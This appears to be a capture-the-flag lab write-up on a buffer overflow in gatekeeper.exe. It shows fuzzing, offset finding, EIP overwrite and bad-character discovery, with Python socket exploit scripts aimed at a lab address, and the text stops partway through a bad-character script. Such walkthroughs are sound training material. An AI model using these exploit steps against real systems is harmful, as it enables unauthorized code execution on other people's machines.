

---

### Deploy Machine and Scan Network

- ![image](https://user-images.githubusercontent.com/94720207/169636811-a9a34ab5-9d7f-42ec-a883-627f1ad94948.png))

- ![image](https://user-images.githubusercontent.com/94720207/169636037-e216bbad-391c-496c-b461-0e2d65dc1b94.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636850-2f3d5382-d440-4761-9dc2-d9acc64dc4d2.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636867-93df1b45-60a1-45d5-85ce-7dd9eb2aac5c.png)


---

### Services Enumeration

- `smbclient -N -L \\\\$ip_target\\`

- ![image](https://user-images.githubusercontent.com/94720207/169636978-f9fc5e1c-08a2-4e13-a051-7b259bcf8ff4.png)

    - **"Users" share is available for login without password, let's sniff inside.**

- `smbclient -N -L \\\\$ip_target\\Users`

    - I've found the executable `gatekeeper.exe` I will download it and prepare the `Buffer Overflow Lab` in my own bare metal Windows 10. 

- ![image](https://user-images.githubusercontent.com/94720207/169637348-142c6a3f-de24-4c58-8bee-b1c7c6046552.png)

---

### Mona Configuration

- The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    - `!mona config -set workingfolder c:\mona\%p`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169673777-cf70c41e-5ce9-445f-885a-77515903a49b.png)
 
---

### Launching gatekeeper.exe

- Launch as admin `gatekeeper.exe` server:

   - ![image](https://user-images.githubusercontent.com/94720207/169685198-48829607-a781-45da-8271-456b697e2262.png)

- Testing connection from a `netcat` - `nc -nv 192.168.1.100 31337` :

    - ![image](https://user-images.githubusercontent.com/94720207/169685595-e1591e28-1289-4c0e-b907-9701a7bf3ba9.png)

- Attach `gatekeeper.exe` to `Immunity Debugger`

    - ![image](https://user-images.githubusercontent.com/94720207/169685344-36efbd2d-0f4a-47ae-a94e-6f1d50a32fdb.png)
  
- Lock and Loaded!

---

### 1. Fuzzing

- First of all, I will run `gatekeeper.exe` as administrator and then start `Immunity Debugger` and attach the program. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169637970-252158e3-9967-41e1-a6ac-587a548bde3f.png)

    - ![image](https://user-images.githubusercontent.com/94720207/169637996-c25fa35e-bcd9-4026-b12b-110bc8870e04.png)

- Then, I will run the Immunity Debugger with "play".

    - ![image](https://user-images.githubusercontent.com/94720207/169638036-2ab7bd99-0fea-484a-af2f-7c2e09a96df6.png)

        - Running and ready to go!

- On Kali Linux:

    1. Connect to `gatekeeper.exe`:
        
        - Using the IP Address of the Windows Machine **192.168.10.100** + gatekeeper.exe Port **31337** (We've seen that port on `nmap` typing "help, help, help")
            
        - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
        - On Kali: `nc -nv 192.168.1.100 31337`
            
        - ![image](https://user-images.githubusercontent.com/94720207/169638159-af1130de-075d-47b0-b6ab-a43b1ca45838.png)
 
 - **It looks that this program `Gatekeeper` take commands based on what you type AKA `strings` to generate an `answer` with the instruction `Hello ("%variable%")!!!`**
  
     - This means, maybe the buffer overflow and/or the pointer of `EIP` that we need to exploit is located there, maybe I need to send 100 bytes of characters, maybe 3000...who knows!?
     
     - So, **we will do our `fuzzing` process to know how many bytes (characters) do we need to crash the program `gatekeeper.exe`**
     
- **As difference with `Vuln Server` Lab, here we are NOT using commands, just a string to make the `gatekeeper server` respond with a `string`**

    - **So, instead of using **`generic_send_tcp`** technique and spiking the strings, I will write a simple python script doing the following large strings and "jump" the spiking process, I really don't care very much being so precise with the breaking point at this moment, so I will only spam thousands of bytes and see what happen.**
    
```python
#!/usr/bin/python

    # Command: python3 -c 'print ("A" * 5000)'

print ('A' * 5000)
```

- Or just using a python command:

    - `python3 -c 'print ("A" * 5000)'` 

- With this simple script we will generate 5000 bytes of "A's" at once:

    - ![image](https://user-images.githubusercontent.com/94720207/169703432-c792cfff-9b98-4475-bd8f-9332af2a3c63.png)

- And we will copy and paste it to the program, it's just like a basic "manual fuzzing" and then press `enter`:

    - ![image](https://user-images.githubusercontent.com/94720207/169638479-071a4226-18aa-4c60-8247-eeef445f0750.png)

- BOOM!!! We did it!!! The `chatserver.exe` have just crashed, it means the `buffer space` of "message" is not sanitized and we can exploit it. 

    - ![image](https://user-images.githubusercontent.com/94720207/169638574-63ddd521-886b-4327-a82b-c0bfdff6feb1.png)

- Bota fixa papai!

    - If we look at `EBP` we can see `41414141`: THAT'S THE HEX CODE FOR: `AAAA`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169456928-65563691-936f-441c-9ade-edf2f7c31752.png) 

    - Also, we went over `ESP` with a bunch of "A"

    - Finally, we get into `EIP` too with `41414141`: THA'TS THE HEX CODE FOR: `AAAA`

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Gatekeeper Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

- We already know that the program `Gatekeeper Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)

- **As difference with `vuln server` we did this process a lot quickier, that's because in this scenario we did not needed `spiking` adn threw random 5000 bytes at once, maybe not so much precise as `spiking` but it's fasterr.**

    - **With just a bunch of "A's" we did realize that the string can crash the program, that means now we need to `find the offset`
    
- we just need to know aprox where we crashed the program, and we know is somewhere around **less than 5000 bytes**

    - Now, that we know that the crash is somewhere less 5000 bytes, we need to know: **where's the `EIP` value at?**

    - Remember, controlling the `EIP` is the puprose of all of this attack. 

### Results

1. **Crashing with `5000` bytes flooding at once**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---  

### 2. Finding the Offset

- First of all, restart everything because the last crash...

- We are going to be looking for where the overwirte the `EIP`: 

    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
    
- **For this step, we will use the tool `pattern_create` by Metasploit:**

    - In Kali machine (-l is for lenght):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169657801-7163e03f-ad5e-4de0-accc-f963221b781b.png)
 
        - Now, instead of sending a bunch of `A`'s we will send the "crazy code", or better said, the pattern algorythm to find the offset.
        
            - **Note: Again, the difference with `vuln server` is that we don't need a string before or `Suffix`, just copy and paste the pattern just like we did with the A's**
            
        - ![image](https://user-images.githubusercontent.com/94720207/169657959-c9040268-2d11-4088-9bcb-1c85ae828abe.png)
        
            - We crashed the `gatekeeper.exe` again, this time with the pattern:
            
        - ![image](https://user-images.githubusercontent.com/94720207/169658066-3761e84e-fbe0-4f81-90e5-1e258f7cf214.png)
 
 - When we send that crazy string we going to get the value on the `EIP` like magic, but how it works?

    1. We send the "crazy code" and we know that in some point it will crash (because it have 5000 bytes and we know it crashes at some point).
    
        - **That "crazy code" is actually a pattern alogythm of characters, so Metasploit can identify the bytes where the crash exactly happened! booom!!!**
    
    3. After the crash, we going to say to Metasppoit:
    
        - **The program have crashed with the `pattern_create`, identify exactly where it crashed, plz! :3.**    

    - Just like in fuzzing: We sent _"TRUN /.:/ Cr4zyCodeCr4zyCodeCodeCr4zyCode..."_ (instead of A's) and matched "the perfect world"
    - We also overwrite `ESP`, `EBP` and `EIP`.
    - It's very similar to the A's, **but in this case we used the Metasploit character `pattern_creator` AKA "the crazy code"**
    
        - NOTE: We can know that we passed by far the crash zone (just like with A's) because we can see a large string on ESP-
        - Remember!: 
        
            1. The perfect world is the large string in `EAX`
            2. Any other large string means that we overwrite that register (`ESP`) by a looooot of chars 
            3. But, the important thing here is that we overwrite `EIP`
        
                - ![image](https://user-images.githubusercontent.com/94720207/169658161-98e52e8c-8083-49af-98da-ba77092e8d56.png)
       
            - **The important and critic value here then is the `EIP`:**
            
                - **`39654138`** 
                            
            - Let's use this value to abuse the vulnerability!

- This step is similar to the last one, but instead of using `pattern_create` tool, we will use `pattern_offset`:

- ![image](https://user-images.githubusercontent.com/94720207/169327203-1bd951d1-a149-4e20-ba65-cecb5cad7020.png)

    - In Kali machine (-l is for lenght), (-q is for query, our finding of the exact **pattern**):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50000 -q 39654138`
   
    - After we press "enter", we should find a **pattern offset**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169658272-bd4dbdcc-d60d-432d-a619-5aa86f752195.png)
        
            - **NOTE: We have 3 different exact matches this time (in vuln server or brainstorm there was only 1 at more than `2000` bytes), this is because the real offset is very close to the beginning `146` bytes, this means that 5000 bytes for fuzzing were too much! I needed just 200 to test maybe...**
            
            - **That's why spiking is used!!! With spiking before fuzzing I would know that the offset would be near from 200 maybe, but I've decided to trhow randomly 5000 chars at once. 
            
            - That's why I used 5000 bytes again in this lab, so spiking is now clear! :D**  
        
            - **This information is critical, because this means that exactly at `146 bytes`, we can control `EIP` overwriting it**

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 3. Controlling EIP

1. Create a new python script called `overflow_gatekeeper_controllingEIP.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**.
  
    - Offset: `146` bytes 

2. Set the `payload` variable to an **empty string**. 

3. Set the `retn` variable to `BBBB`.

    - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 

- **Note: Executing the next script is not necessary for the exploit, so, from here you can only make the script and save it for the next step**

- Create:

    - `overflow_gatekeeper_controllingEIP.py` (chmod +x)

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
- ![image](https://user-images.githubusercontent.com/94720207/169703776-31ae3bba-3102-4c62-9d05-89c594ec9eeb.png)

    - **Execute it:**

        - **`python3 overflow1_step3_controllingEIP.py`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169703821-6b445a04-2d58-443b-ac0d-0f75d66db579.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169703863-9ec7cd5c-b6e5-4439-a5ba-6efe93aa274c.png)

- The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 4. Finding Bad Characters

- Generate a `bytearray` using `mona`, and **exclude the null byte `\x00` by default.** 

- Note the location of the `bytearray.bin` file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be `C:\mona\oscp\bytearray.bin`).

    - `!mona bytearray -b "\x00"`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169704314-ca5db20a-8f20-4e71-9147-019d27b2712e.png)
    
- Now, generate a string of bad chars from \x01 to \xff**:

- Now, generate a string of bad chars from \x01 to \xff**:

```python
# Byte Array (badchars) creator

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

- Now, generate a **string of bad chars** that is **identical to the bytearray** (or just use the next I made:). 

- ![image](https://user-images.githubusercontent.com/94720207/169704736-97989534-ba56-40d8-9794-7771c98cb418.png)
 
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

- Create `overflow_gatekeeper_find_badchars.py` script and set the `payload` variable **to the string of bad chars the script generates.**

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```    

- ![image](https://user-images.githubusercontent.com/94720207/169704833-feaa56fd-938f-4919-89dc-1db656a4b913.png)

- Step by step:

    - Execute first time script:
        
        - **`python3 overflow_gatekeeper_find_badchars.py`**

1. Run the python script for first time with all the badchars from \x01 to \xFF:

    - ![image](https://user-images.githubusercontent.com/94720207/169704921-f00766c9-4181-4f66-8d82-f93bd1fe0a0c.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169704965-7fc65885-85be-4e81-a262-124a942f3863.png)
 
2. **Make a note of the address to which the `ESP` register points:

    - **ESP points: `007619E4`**
    
        - **Manual badchar location**
        
            - ![image](https://user-images.githubusercontent.com/94720207/169705105-708803aa-66db-42dc-bf39-29e18605d93c.png)
            
            - ![image](https://user-images.githubusercontent.com/94720207/169705134-8c1724b2-6db8-4249-bd9b-4c2c2407904d.png)
  
4.  Now use it in the following `mona` command for compare de previously generated byte array:**
    
    - `!mona compare -f C:\mona\oscp\bytearray.bin -a 007619E4`

5. A popup window should appear labelled "mona Memory comparison results". _If not, use the Window menu to switch to it._

    - ![image](https://user-images.githubusercontent.com/94720207/169705265-405bdc27-a93f-4099-9f43-17ced6d37de3.png)

        - **The window shows the results of the comparison**, indicating any characters that are different in memory to what they are in the generated `bytearray.bin` file.

        - **IMPORTANT: Not all of these might be `badchars`! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string. _(Just like the example in the vuln server lab)_**

            - **The first badchar in the list should be the null byte `\x00` since we already removed it from the file.** 
    
            - **Make a note of any others.** `07, 08, 09, 2e, 2f, a0, a1`
            
            - **Remember to take note of the "corrupted" bytes located next the real badchars (08, 09, 2f, a1)** 
            
                 - **Full list : `\x00\x07\x08\x09\x2E\x2F\xA0\xA1`**
    
6. Generate a new `bytearray` in `mona`, specifying these new **`Badchars`** along with `\x00`.

    - `!mona bytearray -b "\x00\x07\x08\x09\x2E\x2F\xA0\xA1"`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169706455-c53cd06c-1536-4770-9062-0ae8f281b4da.png)
     
7. Then update the `payload` variable in your `overflow_gatekeeper_find_badchars.py` script and remove the **new badchars** as well `"\x00\x07\x08\x09\x2E\x2F\xA0\xA1"`.

    - ![image](https://user-images.githubusercontent.com/94720207/169706509-6d289d0e-0a33-4c89-a789-1279d5db834c.png)

```python
payload = "\x01\x02\x03\x04\x05\x06\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

8. Restart `gatekeeper.exe` in `Immunity Debugger` and run the `overflow_gatekeeper_find_badchars.py` script again.

    - ![image](https://user-images.githubusercontent.com/94720207/169705974-bbb00af3-f9e5-4490-9966-a23017cfdad4.png)
    
    - ![image](https://user-images.githubusercontent.com/94720207/169706049-084535ad-bf40-43b0-8342-54d143ad24ae.png)
      
9. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 

    - **ESP points: `00AF19E4`**
    
    - `!mona compare -f C:\mona\oscp\bytearray.bin -a 00AF19E4` 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169679745-27ea4da9-0929-47d3-ac00-6bedfda8c2c5.png)

    - ![image](https://user-images.githubusercontent.com/94720207/169679762-cf839a68-34f9-4d43-ac90-d5b46db07de1.png)
    
        - Total `badchars` : `\x00\x07\x08\x2E\x2F\xA0\xA1`
        - REAL `badchars`  : `\x00\x07\x2e\xa0`  
 
 - **Visual Badchars**
 
     - ![image](https://user-images.githubusercontent.com/94720207/169683987-310da220-595b-4758-ac4c-6e13ab4c8cb0.png)
 
     - ![image](https://user-images.githubusercontent.com/94720207/169684268-893d5639-0048-4f6c-84b0-cf32959cad82.png)
 
### Results























































---
---
----
---

---

### Buffer Overflow

- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:

- **Steps to conduct a buffer overflow:**

    1. _Spiking - Method to find vuln part of the program_ Not necessary in this Lab
    2. Fuzzing - Send a bunch of characters and see if we can break it
    4. Finding the Offset - At what point did we break it
    5. Overwriting the EIP - Overwriting the Poiting Address and control it
    6. Finding Bad Characters - ...
    7. Finding the Right Module - ...
    8. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
    9. Root!

---





---

### Overwriting the EIP

- We know that the offset for make the program crash and point exactly to the `EIP` is at `146 bytes`.

    - **That means, `146 bytes` just before to get to the `EIP`**
    
    - **The `EIP` itself is `4 bytes` long** 
    
- So, we going to overwrite this specific `4 bytes` just after we fill those `146` bytes ;)  

    - **I will use the next python script for the whole Lab, so I will comment line by line _(Script without comment below)_**
    
    - This will be saved as `1_fz3r0_gatekeeper.py`  

```python
    # We declare we are using python:
    
#!/usr/bin/python

    # Import Socket is used to make the connection OUT (script[kali] >> target[windows chatserver.exe])
    # Very similar to netcat
    
import socket

    # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
    # For example: "print(sys.version)" will bring something like "id" linux bash command.

import sys

        # * - The "gatekeeper.exe" prompt for any string (vulverable to buffer overflow!!!)
        #     variable |---> gate_string
    
        # =-=-=-=-=-=-=-=-= The variable "gate_string" contains the next trick! =-=-=-=-=-=-=-=-=-=-=
    
        # "A" * 146    ---> I'll send 146 bytes (A's) each time
        #                    Remember, 146 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
        
        # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 

        # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
        
gate_string = b"A" * 146 + b"B" * 4

    # The script will start with "try"
    # "Try to insert 146 bytes of A's, followed by 4 bytes of B's" 

try:
        
            # Print message to console:
        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
        
            # I'll use the socket module to create the variable "s"
            # This is a very standard usage of the module socket to get IPv4:PORT = Socket
            # We will define out RHOST & RPORT (Target/Windows 10 > gatekeeper.exe)
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',31337))
        
            # Once it connects with the RHOST, the script will only prompt for any string. (Not like other labs with more interactive actions recievend data, that's why I will comment the s.recv option) recieve "intro" Data back from it (The welcome message and that stuff...)
            
        # s.recv(1024)

            # Once it connects with the RHOST, the program start to prompt for data.
            # I will use the Socket Module and variable "s" to send data to the "gatekeeper.exe"
                
                # "gatekeeper.exe" prompt for a << gate_string >> (vulverable to buffer overflow!!!)
                    
                    # send      = "send this"
                    # gate_string   = "b"A" * 146 + b"B" * 4" (++++ tricky payload ++++)
                    # '\r\n\'   = \return \new line (like pressing "enter")
                    # b         = "b" is used before the string to send the string as Bytes and no as String"

        s.send(gate_string + b'\r\n')
              
            # Close connection with RHOST and end.
       
        s.close()

    # Exception script in case some error happen, return a message and exit. 

except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
        sys.exit()
```

- **No comment version:**

```python   
#!/usr/bin/python
    
import socket
import sys
        
gate_string = b"A" * 146 + b"B" * 4

try:            
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',31337))
        s.send(gate_string + b'\r\n')
        s.close()

except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to the script to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169660625-1ed3c045-9a8e-4bcc-badf-e99ef17a335b.png)

- Check that `chatserver.exe` and `immunity debugger` are running (otherwise restart) and...

    - Execute it! Que chille!!! 

        - **`python3 1_fz3r0_gatekeeper.py`**  

    - ![image](https://user-images.githubusercontent.com/94720207/169660788-df5eec00-3491-4249-9f76-7f3c982e1d88.png)

        - Note: Close it with Ctrl+C to end script if needed
        
    - The program crashes, that's perfect! let's see `Immunity Debugger`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169660871-61f0051d-664f-4cde-8600-33d371a707b2.png)

     - And this is how it looks our precious `BBBB` or `42424242`
            
    - **We succesfully overwritten the `EIP` and we have control of it**, but just with an inocent "BBBB" (4 bytes)...
    
        - **It's time to overwirte it with some malicious shellcode containung a 4 bytes of deadly poison!**  

---

### Finding Bad Characters

- When we generate a `shellcode` we need to know what are the `good characters for the shellcode` and the `bad characters for the shellcode`.

    - We can do that by running **ALL THE HEX CHARACTERS** throught our program and see if any of them act up.
    
    - By default, the `Null Byte` : `x00` acts up
    
    - ![image](https://user-images.githubusercontent.com/94720207/169364386-bed635cb-9074-4648-8e94-3692e5cf79d7.png)

- So, we going to see how it's look like and if any of this `bad characters` act up in the program (Vuln Server)

    - If you google-fu `badchars` or follow [this link from bulbsecurity](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) (view page source for copy/paste it Mr. Hacker :P) or just use this:
    
```
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

- Then, we will copy the badchars code to a new variable called `badchars`

    - **Important!** Erase the Nullbyte `\x00` and initial string `badchars =` **that's a `badchar` that makes a lot of issues by default**
    
    - **Inser "b"'s before each shellcode line (to convert to bytes each string)** 
    
    - In my case, I will save it as another file `2_fz3r0_gatekeeper.py` 

- Aditionally,  I will modify the line `s.send gate_string` with this:

    - `s.send(gate_string + badchars + b'\r\n')` 

```python   
#!/usr/bin/python
    
import socket
import sys
        
gate_string = b"A" * 146 + b"B" * 4
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
